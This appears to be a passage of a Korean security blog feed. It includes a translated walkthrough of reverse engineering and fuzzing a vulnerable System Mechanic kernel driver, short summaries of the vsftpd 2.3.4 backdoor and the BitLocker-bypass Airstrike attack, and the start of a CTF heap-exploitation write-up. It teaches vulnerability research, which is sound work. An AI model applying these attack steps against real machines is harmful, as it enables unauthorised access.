    <content type="html"><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>중간고사 망한 L0ch입니다. 아직 3과목이나 남았지만 눈에 띄는 글이 있어 망한 김에 시험공부는 던지고 번역해봤습니다. 인생..  </p><blockquote><p>교수님 이제 그만 절 놓아주세요..</p></blockquote><p>커널 드라이버 취약점에 대해 알기 쉽게 정리한 글이 있어서 파트 2로 나눠서 정리해봤습니다. 파트 1에서는 드라이버 구조에 대한 소개와 IOCTL, 드라이버 퍼징에 대한 내용을 다루며 파트 2에서는 본격적인 드라이버 취약점의 root cause 분석과 익스플로잇에 대해 다룹니다!  </p><blockquote><p>원문 글 : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><hr><p>지난달 last&amp;VoidSec은 NULLCON에서 Ashfaq Ansari(@HackSysTeam)의 Windows Kernel Exploitation Advanced 과정을 수강했다. 이 과정은 흥미로웠으며 core kernel 공간의 개념과 mitigation 우회 및 exploit에 대해 다루었다. 마지막 실습인 <code>Write an exploit for System Mechanics</code> 에서는 더 이상의 힌트는 제공되지 않았으며 우리는 새로 습득한 지식과 교육 자료에 대한 이해와 리버스 엔지니어링을 테스트하기 위해 도전했다. 이 실습을 어떻게 수행했는지, 그리고 사전 지식 없이 실제 드라이버를 어떻게 활용했는지에 대해 자세히 알아보도록 한다.</p><h1 id="Windows-drivers-101"><a href="#Windows-drivers-101" class="headerlink" title="Windows drivers 101"></a>Windows drivers 101</h1><p>드라이버를 리버스 엔지니어링하고 취약점을 찾기 전에 먼저 드라이버가 무엇이며 어떻게 작동하는지 살펴봐야 한다. Windows에서 드라이버는 기본적으로 특정 이벤트가 발생할 때 커널 컨텍스트에서 실행되는 코드를 포함하는 로드 가능한 모듈로 정의할 수 있다. 이벤트는 운영체제가 수행하는 인터럽트 또는 프로세스일 수 있으면 커널은 이러한 인터럽트를 처리하고 요청을 수행하기 위해 적절한 드라이버를 실행한다. 따라서 드라이버 = 커널의 DLL이라고 생각할 수 있다. 드라이버는 프로세스 탐색기에서 시스템 프로세스(PID 4가 있는 모듈) 내에서 로드된 모듈로 나열된다.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled.png" alt="exploiting-driver/Untitled.png"></p><blockquote><p>PID 4(System Process)에 로드된 모듈</p></blockquote><h2 id="Driver-Entry"><a href="#Driver-Entry" class="headerlink" title="Driver Entry"></a>Driver Entry</h2><p>이제 드라이버의 구조를 살펴보겠다. 대부분의 코드와 마찬가지로 드라이버에는 <code>DriverEntry</code>라는 일종의 <code>main</code> 함수가 존재한다. 이 기능은 다음과 같이 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers">Microsoft 문서</a>에 정의되어 있다.</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span> <span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PDRIVER_OBJECT DriverObject,</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PUNICODE_STRING RegistryPath</span></span><span class="hljs-function"><span class="hljs-params">)</span> </span>;</code></pre><p>인수 앞의 <code>_In_</code> 은 인수가 <code>DriverEntry</code> 함수에 전달되는 입력값이어야 한다는 의미이다. <code>DriverObject</code> 인수는 드라이버에 대한 정보를 보유하는 <code>DRIVER_OBJECT</code> 데이터 구조에 대한 포인터를 나타내며 이후에 더 자세히 설명하도록 하겠다. <code>RegistryPath</code> 인수는 드라이버 이미지(커널이 드라이버 코드를 로드하는 <code>.sys</code> 파일)의 레지스트리 경로를 포함하는 <code>UNICODE_STRING</code> 구조체 (UTF-16 문자열 및 기타 제어정보를 포함하는 구조체)에 대한 포인터이다.</p><h2 id="Devices-amp-Symlinks"><a href="#Devices-amp-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h2><p>유저 모드에서 액세스 하려면 드라이버가 표준 유저 프로세스에 액세스할 수 있도록 장치와 심볼릭 링크(a.k.a symlink)를 만들어야 한다. 장치는 프로세스가 드라이버와 상호작용 할 수 있도록 하는 인터페이스이며 심볼릭 링크는 <code>Win32</code>함수를 호출하는 동안 사용할 수 있는 장치 이름(alias-별칭)이다.</p><p>심볼릭 링크의 예:  <code>C:\</code>는 저장장치를 위한 심볼릭 링크에 불과하다. <code>Sysinternals</code>의 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/winobj">WinObj</a> 툴을 사용해 root namespace 아래의 <code>GLOBAL??</code>  디렉터리에서 <code>C:</code>를 찾을 수 있다.  </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%201.png" alt="exploiting-driver/Untitled%201.png"></p><p>드라이버는 <code>IoCreateDevice</code> 및 <code>IoCreateSymbolicLink</code>를 사용하여 장치 및 심볼릭 링크를 만든다. 드라이버를 리버스 엔지니어링 할 때 위 두 함수가 연속적으로 호출이 장치와 심볼릭 링크를 인스턴스화 하는 부분인 것을 확인할 수 있다. 대부분의 드라이버는 하나의 장치만 사용하므로 대부분 한 번만 발생하며 일반적으로 장치 이름은 <code>\Device\VulnerableDevice</code> 형식을 사용한다. 반면 심볼릭 링크는 <code>\\.\VulnerableDeviceSymlink</code> 형식과 유사하다. 이제 드라이버의 “frontend”에 대해 설명했으므로 “backend”인 디스패치 루틴에 대해 설명하겠다.</p><h2 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h2><p>드라이버는 장치에서 호출되는 함수에 따라 다른 작업(a.k.a 함수/루틴)을 실행한다. 드라이버는 <code>WriteFile</code>, <code>ReadFile</code> 또는 <code>DeviceIoControl</code> API가 해당 장치에서 호출될 때 각각 다르게 작동할 수 있다. 이 동작은 <code>DriverObject</code>구조체의 함수 포인터 배열인 <code>MajorFunctions</code>멤버를 통해 드라이버 개발자가 제어한다. <code>WriteFile</code>, <code>ReadFile</code> 또는 <code>DeviceIoControl</code>과 같은 API는 <code>MajorFunctions</code> 내에 해당 인덱스가 있어 관련 함수 포인터가 호출된다. 일부 매크로를 사용하여 관련 인덱스를 기억할 수 있으며 다음은 몇 가지 예다.</p><ul><li><code>IRP_MJ_CREATE</code> : <code>CreateFile</code> 호출 후 호출되는 함수 포인터를 포함하는 인덱스</li><li><code>IRP_MJ_READ</code> : <code>ReadFile</code>과 같은 함수와 관련된 인덱스</li><li><code>IRP_MJ_DEVICE_CONTROL</code> : DeviceIoControl에 해당하는 인덱스</li></ul><p>드라이버 개발자가 <code>MyDriverRead</code> 라는 함수를 정의했으며 프로세스가 드라이버 장치에서 <code>ReadFile</code> API를 호출할 때 호출되기를 원한다고 가정해본다. <code>DriverEntry</code> 내부 (또는 호출된 함수)에 다음 코드를 작성하면 된다.</p><pre><code class="hljs cpp">DriverObject-&gt;MajorFunctions[IRP_MJ_READ] = MyDriverRead;</code></pre><p>이와 같은 함수는 디스패치 루틴의 이름을 사용한다. 그러나 <code>MajorFunctions</code>는 제한된 크기의 배열이므로 드라이버에 많은 디스패치 루틴을 할당하지 못한다. 이 문제점은 유저 모드 함수 <code>DeviceIoControl</code> 를 사용하는 이유가 된다.</p><h2 id="DEVICEIOCONTROL-amp-IOCTL-Codes"><a href="#DEVICEIOCONTROL-amp-IOCTL-Codes" class="headerlink" title="DEVICEIOCONTROL &amp; IOCTL Codes"></a>DEVICEIOCONTROL &amp; IOCTL Codes</h2><p><code>IRP_MJ_DEVICE_CONTROL</code>로 정의된 <code>MajorFunctions</code> 내에는 특정 인덱스가 있다. 이 인덱스에는 드라이버 장치에서 <code>DeviceIoControl</code> API 호출 후 호출되는 디스패치 루틴의 함수 포인터가 저장된다. 이 함수는 인수 중 하나가 IOCTL로 알려진 32 비트 정수이기 때문에 매우 중요하다. 이 I/O 코드는 드라이버에 전달되고 <code>DeviceIoControl</code>을 통해 전달되는 IOCTL에 따라 각각의 작업을 수행한다. 인덱스 <code>IRP_MJ_DEVICE_CONTROL</code>의 디스패치 루틴은 코드의 다음과 같은 스위치 케이스처럼 작동한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(IOCTL)&#123;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xDEADBEEF</span>:        DoThis();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xC0FFEE</span>;        DoThat();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0x600DBABE</span>;    DoElse();    <span class="hljs-keyword">break</span>;&#125;</code></pre><p>이러한 방식으로 개발자는 프로세스에서 전송하는 IOCTL 코드에 따라 드라이버가 함수를 호출하도록 할 수 있다. 이러한 종류의 “코드 지문”은 드라이버를 리버스 엔지니어링 하는 동안 찾기가 매우 쉽기 때문에 매우 중요하다. 어떤 IOCTL이 어떤 코드로 연결되는지 알면 드라이버를 더 쉽게 분석하고 퍼징할 수 있다.</p><h1 id="Reverse-Engineering-Finding-the-IOCTL"><a href="#Reverse-Engineering-Finding-the-IOCTL" class="headerlink" title="Reverse Engineering: Finding the IOCTL"></a>Reverse Engineering: Finding the IOCTL</h1><p>드라이버 리버스 엔지니어링을 시작하기 전에 첫 번째로 해야 할 일은 통신에 사용하는 IOCTL 코드와 장치 이름 (symlink)을 찾는 것이다. 우리의 경우 대상 애플리케이션은 <code>iolo – System Mechanic Pro v.15.5.0.61 (amp.sys)</code>이며 설치 시 <code>WinObj</code>를 활용하여 다음과 같이 장치 이름과 권한을 복구했다.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%202.png" alt="exploiting-driver/Untitled%202.png"></p><p>이제 장치 이름 <code>\Device\AMP</code>을 수집했으니 드라이버 <code>amp.sys</code>를 디스어셈블러 (IDA 사용)에 로드하고 누락된 경우 다음과 같은 필요한 구조체를 추가한다.</p><ul><li><code>DRIVER_OBJECT</code></li><li><code>IRP</code></li><li><code>IO_STACK_LOCATION</code></li></ul><p><code>DriverEntry</code> 함수에 도달하면 드라이버가 생각보다 조금 더 복잡하다는 것을 알 수 있다. <code>Imports</code> 섹션에서 <code>IoDeviceControl</code> API를 xref하기로 결정했으며 그 결과는 <code>SUB_2CFE0</code>(<code>DriverCreateDevice</code>로 변경) 하나뿐이다. </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%203.png" alt="exploiting-driver/Untitled%203.png"></p><p><code>DeviceName</code>이 인스턴스화 되고 <code>DriverObject</code>가 전달되는 것을 볼 수 있으므로 올바른 함수에 도달했음을 알 수 있고 디컴파일을 진행했다.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%204.png" alt="exploiting-driver/Untitled%204.png"></p><p><code>MajorFunction[14] (offset 0x0e)</code>을 살펴보면 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control">IRP_MJ_DEVICE_CONTROL</a> 드라이버를 찾을 수 있다. 이는 시스템 정의 IOCTL 세트가 있는 경우 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch">DispatchDeviceControl</a> 루틴에서 드라이버가 지원해야 하는 요청이다. <code>SUB_2C580</code>을 디컴파일하면 이 드라이버에 대한 IOCTL 코드에 도달할 수 있다. 아래의 디컴파일 코드를 보고 직접 IOCTL 코드를 찾아보자.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_2C580</span><span class="hljs-params">(__int64 a1, IRP *a2)</span></span><span class="hljs-function"></span>&#123;  BOOLEAN v3; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  ULONG v4; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _IO_STACK_LOCATION *v5; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  PNAMED_PIPE_CREATE_PARAMETERS v7; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  a2-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  v5 = a2-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( v5-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">2252803</span> )  &#123;    v4 = v5-&gt;Parameters.Create.Options;    v7 = v5-&gt;Parameters.CreatePipe.Parameters;    v3 = IoIs32bitProcess(a2);    v6 = sub_166D0(v3, v7, v4);  &#125;  <span class="hljs-keyword">else</span>  &#123;    v6 = <span class="hljs-number">-1073741808</span>;  &#125;  a2-&gt;IoStatus.Status = v6;  IofCompleteRequest(a2, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> v6;&#125;</code></pre><p>찾을 수 없거나 분석이 추가된 코드를 원한다면 다음 코드를 살펴보자.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Driver_IRP_MJ_DEVICE_CONTROL</span><span class="hljs-params">(DEVICE_OBJECT *DeviceObject, IRP *Irp)</span></span><span class="hljs-function"></span>&#123;  __int64 result; <span class="hljs-comment">// rax</span>  _BYTE Is32BitProcess; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  _DWORD bufferSize; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _QWORD IoStackLocation; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  NTSTATUS status; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  _QWORD userBuffer; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  _QWORD; <span class="hljs-comment">// [rsp+68h] [rbp+10h]</span>  Irp-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  IoStackLocation = Irp-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( IoStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">0x226003</span> )<span class="hljs-comment">// IOCTL Code</span>  &#123;    bufferSize = IoStackLocation-&gt;Parameters.Create.Options;    userBuffer = &amp;IoStackLocation-&gt;Parameters.CreatePipe.Parameters-&gt;NamedPipeType;    Is32BitProcess = IoIs32bitProcess(Irp);    status = DriverVulnerableFunction(Is32BitProcess, userBuffer, bufferSize);  &#125;  <span class="hljs-keyword">else</span>  &#123;    status = <span class="hljs-number">0xC0000010</span>;                        <span class="hljs-comment">// STATUS_INVALID_DEVICE_REQUEST</span>  &#125;  Irp-&gt;IoStatus.Status = status;  IofCompleteRequest(Irp, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)status;&#125;</code></pre><p>IOCTL 코드 <code>0x226003</code>는 IOCTL 요청과 함께 전달된 데이터 버퍼에 액세스할 때 커널이 사용하는 방법을 이해하기 위해 추가로 디코딩될 수 있다. <a href="https://www.osronline.com/article.cfm%5Earticle=229.htm">OSR 온라인 IOCTL 디코더</a> 툴을 사용하여 다음 정보를 복구할 수 있다.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%205.png" alt="exploiting-driver/Untitled%205.png"></p><p><code>METHOD_NEITHER</code>는 IOCTL 요청과 함께 전달된 데이터 버퍼에 액세스하는 데 사용되는 가장 취약한 방식이다. 이를 사용할 때 I/O 관리자는 유저 데이터에 대해 어떤 종류의 유효성 검사도 수행하지 않고 원시 데이터를 드라이버에 그대로 전달한다. 유효성 검사 없이 유저 데이터를 관리하는 코드에 있는 버그 또는 취약점을 발견할 확률이 더 높다. 이제 IOCTL 코드 <code>0x226003</code>와 장치 이름 <code>\Device\AMP</code>을 구했으니 드라이버를 퍼징하고 취약점을 찾을 수 있다.</p><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><p>IOCTL 코드를 검색한 후 <a href="https://github.com/koutto/ioctlbf">ioctlbf</a>로 드라이버를 퍼징했다. Ioctlbf 구문은 이해하기 매우 쉽다. 먼저 장치 이름 <code>-d</code> 를 지정한 다음 퍼징할 IOCTL 코드를 <code>-i</code>로 지정한 뒤 <code>-u</code> 매개 변수를 사용하여 제공된 IOCTL 코드만 퍼징하도록 한다. (드라이버에 IOCTL 코드가 하나만 있다는 것을 이미 알고 있으므로 무차별 대입이 필요 없다.)</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%206.png" alt="exploiting-driver/Untitled%206.png"></p><p>ioctlbf를 실행한 직후 다음 메시지 <code>amp+6c8d</code>와 함께 디버기 머신에서 크래시가 발생했다.</p><pre><code class="hljs apache"><span class="hljs-attribute">Access</span> violation - code c<span class="hljs-number">0000005</span> (!!! second chance !!!)<span class="hljs-attribute">fffff801</span>`<span class="hljs-number">3</span>ae<span class="hljs-number">96</span>c<span class="hljs-number">8</span>d <span class="hljs-number">488</span>b<span class="hljs-number">0</span>e          mov     rcx,qword ptr<span class="hljs-meta"> [rsi]</span><span class="hljs-attribute">PROCESS_NAME</span>:  ioctlbf.EXE<span class="hljs-attribute">READ_ADDRESS</span>:  <span class="hljs-number">0000000000000000</span> <span class="hljs-attribute">ERROR_CODE</span>: (NTSTATUS) <span class="hljs-number">0</span>xc<span class="hljs-number">0000005</span> - The instruction at <span class="hljs-number">0</span>x%p referenced memory at <span class="hljs-number">0</span>x%p. The memory could not be %s.<span class="hljs-attribute">EXCEPTION_CODE_STR</span>:  c<span class="hljs-number">0000005</span><span class="hljs-attribute">EXCEPTION_PARAMETER1</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">EXCEPTION_PARAMETER2</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">STACK_TEXT</span>:  <span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">0</span> ffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> : amp+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">8</span>d<span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">8</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : <span class="hljs-number">0</span>xffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span><span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>f<span class="hljs-number">0</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffe<span class="hljs-number">60</span>b`e<span class="hljs-number">5303</span>c<span class="hljs-number">80</span> : <span class="hljs-number">0</span>x<span class="hljs-number">1</span></code></pre><p>널 포인터 역 참조와 유사한 오류이다. 이제 드라이버를 리버스 엔지니어링해 access violation이 발생한 이유와 이를 악용할 수 있는 방법이 있는지 이해하기로 했다.</p><hr><p>다음 파트는 취약점의 root cause 분석과 익스플로잇에 대한 번역으로 돌아오겠습니다!</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>ioctl</tag>
      
      <tag>L0ch</tag>
      
      <tag>driver</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2011-2523: 현재진행형인 10년 전 vsftpd 백도어 취약점</title>
    <link href="/2021/04/20/l0ch/2021-04-20/"/>
    <url>/2021/04/20/l0ch/2021-04-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nitter.42l.fr/80vul/status/1382548572604813314">Just search for “vsftpd version number” directly in ZoomEye</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vsftpd 2.3.4</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2011-2523은 10년 전 vsftpd 2.3.4에서 발견된 취약점입니다.</p><p>소스코드에 포함된 원인불명의 백도어는 포트 6200에서 listening shell을 열고, 해커는 공개된 간단한 <a href="https://www.exploit-db.com/exploits/49757?utm_source=dlvr.it&utm_medium=twitter">exploit</a>을 통해 이를 매우 쉽게 악용할 수 있어 높은 심각도로 분류되었습니다.</p><p>해당 취약점은 2011년 7월 패치되었지만 서비스 구성 요소 검색 엔진인 ZoomEye의 vsftpd 버전 검색 결과에 따르면 약 10년이 지난 지금 전 세계의 많은 서버에서 여전히 취약점이 존재하는 vsftpd 2.3.4 버전을 사용하고 있는 것이 확인되었습니다.</p><p><img src="/2021/04/20/l0ch/2021-04-20/zoomeye.png" alt="zoomeye"></p><p>이는 취약점에 대한 보안업계의 대처가 패치 릴리즈뿐만이 아닌 다각도의 사후관리 또한 필요함을 나타냅니다.</p></br><blockquote><p>상용 서비스를 대상으로 취약점을 악용하여 발생한 분쟁에 대해 hackyboiz는 어떠한 책임도 지지 않습니다.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>L0ch</tag>
      
      <tag>vsftpd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28316: Windows workstation FDE bypass and EOP</title>
    <link href="/2021/04/19/idioth/2021-04-19/"/>
    <url>/2021/04/19/idioth/2021-04-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://shenaniganslabs.io/2021/04/13/Airstrike.html">Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE-2021-28316)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>도메인에 가입된 Windows 10 host</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>와이파이 기능을 가지고 있는 Windows 노트북이나 워크스테이션에 물리적으로 접근 가능할 시 잠금 화면 및 BitLocker Full Disk Encryption을 우회하고 파일 시스템에 대한 접근 권한을 얻을 수 있는 취약점이 발견되었습니다.</p><p>Windows 환경에서 도메인 사용자가 MSCHAPv2와 PEAP를 함께 사용하여 무선 액세스 포인트에 인증할 때 resulting challenge response hash는 도메인 사용자의 패스워드의 NTLM 해쉬로부터 파생됩니다. 도메인 사용자 인증뿐만 아니라 컴퓨터 인증을 위한 옵션도 제공합니다. 컴퓨터 인증은 클라이언트 인증서나 MSCHAPv2를 사용하지만 PEAP와 MSCHAPv2를 같이 사용할 경우 도메인 컴퓨터 계정의 NTLM 해쉬가 인증에 사용됩니다. 보통 암호는 복구할 수 없지만 NTLM 해쉬는 <a href="https://crack.sh/wpa-enterprise/">crack.sh</a>를 통해 복구할 수 있습니다.</p><p>취약점을 악용하는 방법은 다음과 같습니다.</p><ol><li><a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a>를 사용하여 내부 인증 방법으로 설정된 MSCHAPv2를 통해 PEAP를 지원하는 액세스 포인트 생성</li><li><a href="https://github.com/moxie0/chapcrack">chapcrack</a>을 사용하여 MSCHAPv2 challenge response hash를 cloud crack 형식으로 변환</li><li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>의 <code>ticketer.py</code>과 NTLM hash를 통해 전체 파일 시스템에 액세스</li></ol><p>BitLocker Full Disk Encryption을 우회하기 위해서 해커가 제어하는 네트워크에 연결하여 도메인 SID를 얻어야 합니다. hostapd를 사용하여 WPA2-PSK 네트워크를 생성한 후 LDAP ping을 통해 Active Directory Domain name, victim의 host name, 도메인 SID를 얻을 수 있습니다. 그 후 <code>ticketer.py</code>를 사용하면 전체 파일 시스템에 대한 접근 권한을 얻을 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</title>
    <link href="/2021/04/18/l0ch/pwncoolsexy-part4/"/>
    <url>/2021/04/18/l0ch/pwncoolsexy-part4/</url>
    
    <content type="html"><![CDATA[<h1 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p><p>안녕하세요 L0ch입니다! </p><p>벌써 블로그 오픈한지 반년이 되는 4월이네요!  <del><em>그리고 다음주면 중간고사랍니다 흑ㅎ그 ㅠㅠ</em></del> </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png" alt="pwncoolsexy-part4/Untitled.png"></p><blockquote><p>나.. 졸업할 수 있을까..?</p></blockquote><p>시험기간에는 역시 딴 거 하는 게 제일 재밌죠. 그래서 이번 파트는 시험기간 버프를 받아 제일 재밌게 작성했습니다 ㅎㅎ; (학점과 등가 교환한 건 덤) 오늘은 HITCON 2019 Quals에 출제된 Windows pwnable 문제인 dadadb를 풀어보면서 NT Heap에서의 exploitation을 자세하게 다뤄보겠습니다! </p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Windows x64 on windows sever 2019<ul><li>Similar to Windows 10 (1809)</li></ul></li><li>AppJailLauncher</li><li>DEP</li><li>ASLR</li><li>CFG</li><li>자식 프로세스 생성 불가<ul><li>새 프로세스 생성 불가능</li></ul></li><li>Private Heap</li></ul><p>Windows 1809 (빌드 17763.1) 환경에서 진행했습니다! </p><p>여담으로.. Windows10 1809 버전에서는 Windows Terminal 지원이 안돼 눈물을 머금고 winpwn의 폰트 스타일을 지원하지 않는 다른 터미널을 쓸 수 밖에 없었습니다;; 해킹할 땐 모니터가 화려해야 하는데.. 그럼 익스 안되던 것도 되는거 ㅇㅈ?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png" alt="pwncoolsexy-part4/Untitled%201.png"></p><blockquote><p><strong>주의</strong> 겉멋만 들면 망한다.</p></blockquote><p>제 얘기네요 ㅎㅎ.. 아무튼, 문제 바이너리를 찬찬히 뜯어보면서 분석을 시작해보겠습니다! </p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>바이너리를 실행하면 다른 설명 없이 입력을 받는데, 1번으로 로그인할 수 있습니다. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png" alt="pwncoolsexy-part4/Untitled%202.png"></p><p><code>user.txt</code>에 있는 여러 계정과 패스워드 중 하나로 로그인하면 간단한 DB 기능이 구현된 걸 확인할 수 있네요.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png" alt="pwncoolsexy-part4/Untitled%203.png"></p><blockquote><p>user.txt의 계정과 패스워드</p></blockquote><p>로그인한 이후 메뉴는 다음과 같습니다.</p><ol><li>add<ul><li>key, size, data를 입력받아 노드 추가</li><li>node list에 key가 존재하면 해당 key의 data 수정</li></ul></li><li>view<ul><li>key를 입력받아 노드 검색 후 key와 data 출력</li></ul></li><li>delete<ul><li>key를 입력받아 해당하는 노드 삭제</li></ul></li><li>logout<ul><li>로그아웃하고 로그인 전으로 돌아감</li></ul></li></ol><p>기능이 많지 않아 이 정도로만 정리하고 바로 취약점부터 찾아볼게요.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>우선 입력받은 데이터를 저장하는 구조체인 <code>node</code> 는 아래와 같으며 256개의 포인터 배열로 선언되어 있습니다.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png" alt="pwncoolsexy-part4/Untitled%204.png"></p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span><span class="hljs-keyword">char</span>* data;<span class="hljs-keyword">size_t</span> size;<span class="hljs-keyword">char</span> key[<span class="hljs-number">41</span>];<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>&#125;<span 